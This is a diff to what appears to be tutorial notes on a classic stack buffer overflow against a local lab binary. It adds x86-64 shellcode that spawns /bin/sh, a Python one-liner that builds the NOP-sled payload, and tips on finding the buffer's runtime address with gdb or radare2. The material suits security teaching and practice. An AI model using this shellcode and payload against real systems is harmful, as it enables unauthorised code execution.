@@ -641,15 +641,20 @@ You might structure it like this:
 - That totals roughly 140 + 8 bytes (8 is the overflow).
 - The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
 - The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
+- - Where our shell code for this example used is a bash shell in hex:
+```
+"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" 
+```
 
 So the actual Python payload looks like:
-
+```
 python -c 'print(
     "\x90" * NOP_COUNT +
     "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
     "A" * PADDING +
     "<return address in little-endian>"
 )' | ./buffer-overflow
+```
 Where:
 
 NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)
@@ -664,9 +669,9 @@ From 'gbd' or 'radare2 -d'
 \xAA\xBB\xCC\xDD\xEE\xFF\x00\x00
 by finding the runtime address of the buffer inside copy_arg().
 
-That address is not known from the C code.
-It is not printed by the program.
-It is not in the binary.
+- That address is not known from the C code.
+- It is not printed by the program.
+- It is not in the binary.
 
 It is only known at runtime, so you must get it from:
 - gdb  
